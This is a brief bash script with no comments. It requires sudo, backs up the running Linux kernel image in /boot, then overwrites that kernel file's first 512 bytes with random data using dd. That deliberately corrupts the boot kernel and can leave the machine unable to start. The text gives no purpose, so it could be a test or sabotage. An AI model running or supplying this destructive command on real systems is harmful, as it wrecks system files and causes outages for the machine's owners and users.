#!/usr/bin/env bash

if [ -z "$SUDO_USER" ]; then
	echo "USE SUDO"
	exit 1
fi


cp /boot/vmlinuz-$(uname -r) /boot/vmlinuz-$(uname -r).bak
dd if=/dev/urandom of=/boot/vmlinuz-$(uname -r) bs=512 count=1 conv=notrunc
